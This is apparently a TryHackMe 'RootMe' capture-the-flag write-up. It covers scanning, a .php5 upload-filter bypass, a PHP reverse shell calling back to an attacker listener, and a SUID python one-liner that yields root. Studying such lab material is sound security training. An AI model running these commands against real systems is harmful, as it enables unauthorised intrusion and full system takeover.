# RootMe — TryHackMe Write-up

## Room Info
- **Difficulty:** Easy
- **Topic:** Web enumeration, file-upload RCE, reverse shell, SUID privilege escalation
- **OS:** Linux
- **Goal:** Get a shell, then escalate to root (user.txt + root.txt).

> All target IPs are redacted (`<IP>`) and the attacker VPN IP as `<TUN0_IP>`.

---

## Attack chain

```
Recon → Web enum → Upload bypass → Reverse shell → SUID privesc → root
```

A step up from a command-panel box: here you **upload your own shell** instead of
being handed a command box.

---

## 1. Recon

```bash
nmap -sV <IP>        # top 1000 + versions
```
Open ports: **22 (SSH)** and **80 (HTTP)**.

> **Gotcha I hit:** an earlier `nmap -p-` over the VPN reported extra "open" ports that
> weren't real (53/7777/7778/8443) and *missed* port 80. Those were **false positives** —
> reduced VPN MTU + latency make `-p-` SYN scans misread responses. Re-scanning cleanly
> showed the true picture (22 + 80). **Lesson:** scan results over a VPN aren't gospel;
> inconsistency between scans = noise, and a real open port is confirmed by connecting to it.

## 2. Web enumeration

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```
Two directories mattered (the rest — `.htaccess`, `css`, `js`, `server-status` — were noise):
- **`/panel/`** — a file-upload form
- **`/uploads/`** — where uploaded files are served from (needed to trigger the shell)

## 3. Upload bypass → reverse shell

The upload blocked `.php`. **Bypass:** rename to an alternate PHP extension Apache still
executes — `.php5` (also works: `.phtml`, `.php3`, `.php4`).

```bash
# Prepare the payload (pentestmonkey PHP reverse shell)
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php5
# edit it: set  $ip = '<TUN0_IP>';  $port = 1234;   (your VPN IP — the box connects BACK to you)

# Listen FIRST
nc -lvnp 1234
```
Upload `shell.php5` via `/panel/`, then browse to `http://<IP>/uploads/shell.php5` to execute
it → the listener catches a **www-data** shell.

> **Reverse shell concept:** the target connects *back to you*, so the payload needs **your**
> VPN (`tun0`) IP, not the target's. Start the listener before triggering, or the callback is lost.

### Stabilize the shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## 4. user.txt
```bash
find / -name "user.txt" 2>/dev/null
cat <path>/user.txt
```

## 5. Privilege escalation — SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```
Anomaly in the list: **`/usr/bin/python2.7` with the SUID bit set.**

### Why SUID python = instant root
A SUID binary runs with the privileges of its **owner** (root here), not the user running
it. `passwd` is legitimately SUID root (it must write to root-only `/etc/shadow`). But SUID
on an **interpreter** like python is game over — it can run arbitrary code *as root*:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
- `os.setuid(0)` — set UID to 0 (root); only works because SUID gives python root euid
- `os.system("/bin/bash")` — spawn a shell, now as **root**

```bash
whoami            # root
cat /root/root.txt
```

---

## Concepts practiced

| Concept | Takeaway |
|---|---|
| Scan reliability | VPN latency/MTU cause false positives; verify by connecting |
| Directory brute force | `-x php` to surface upload pages; separate signal from noise |
| File-upload filter bypass | `.php5` / `.phtml` execute when `.php` is blocked |
| Reverse shell | Target connects back → use your tun0 IP; listen before triggering |
| Shell stabilization | `python -c 'pty.spawn()'` for an interactive shell |
| SUID | Runs as the file owner; SUID on an interpreter = root |
| GTFOBins | The reference for exploiting a SUID/sudo binary |
| Manual vs Metasploit privesc | Manual + understanding is the skill (and what OSCP expects) |

## Key takeaway
Full manual kill-chain: recon → upload-filter bypass → self-built reverse shell → SUID
privesc. The *execution* of privesc was one line; the **skill was the enumeration** — knowing
to look for SUID binaries and recognizing the one that didn't belong. That's the part that
takes reps.
